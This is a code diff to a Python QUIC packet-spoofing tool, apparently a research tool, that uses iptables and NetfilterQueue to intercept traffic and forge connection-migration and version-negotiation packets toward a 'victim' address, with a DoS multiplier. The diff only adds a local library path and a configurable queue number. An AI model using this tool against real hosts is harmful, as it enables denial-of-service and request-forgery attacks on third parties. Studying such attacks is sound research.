@@ -1,5 +1,14 @@
 #!/usr/bin/python3
 
+import sys
+import os
+
+
+# Add the local aioquic repository to the Python path
+current_dir = os.path.dirname(os.path.abspath(__file__))
+aioquic_path = os.path.join(current_dir, 'aioquic', 'src')
+print(aioquic_path)
+sys.path.insert(0, aioquic_path)
 #from concurrent.futures import process
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
@@ -11,6 +20,9 @@ import argparse
 from argparse import RawTextHelpFormatter
 from multiprocessing import Process
 import traceback
+
+
+
 
 import aioquic
 from aioquic.asyncio.client import connect
@@ -48,7 +60,7 @@ SPOOFED_COUNT = 0
 PACKET_COUNT = 0
 
 # Iptables Templates
-iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
+iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num {queue_num}"
 
 # Legacy Lsquic and quicly support, adjust to the correct install path
 lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
@@ -84,6 +96,7 @@ def parse_arguments():
     parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
     parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
     parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
+    parser_cm.add_argument('--queue_num','-q', help='Defines the queue number for the process to be binded, default 1', type=int, default=1)
     parser_cm._optionals.title = 'Optional Arguments'
     parser_cm._positionals.title = 'Required Arguments'
 
@@ -144,7 +157,7 @@ def connection_migration_callback(packet, starttime=0, args=None):
         if args.limit != 0:
             SPOOFED_COUNT += 1
 
-    #if time.time()-starttime > args.start_time:
+    # if time.time()-starttime > args.start_time:
     #    packet = spoof_packet(packet, args.target_ip, args.target_port)
     #    if args.limit != 0:
     #        SPOOFED_COUNT += 1
@@ -233,7 +246,7 @@ def main():
     print(banner)
 
     starttime = time.time()
-    iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
+    iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port, queue_num = args.queue_num)
     print("[+] Inserting iptables rules.")
     print(iptables_insert)
     subprocess.run(iptables_insert.split())
@@ -243,7 +256,7 @@ def main():
         q = NetfilterQueue()
         if args.mode == 'cm':
             args.limit = args.limit * args.dos
-            q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
+            q.bind(args.queue_num, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
         elif args.mode == 'vn':
             args.limit = args.dos
             q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
@@ -290,7 +303,7 @@ def main():
     q.unbind() 
     
     print("[-] Deleting iptables rule(s).")
-    iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
+    iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port, queue_num = args.queue_num)
     print(iptables_delete)
     subprocess.run(iptables_delete.split())
     print("[+] Done")
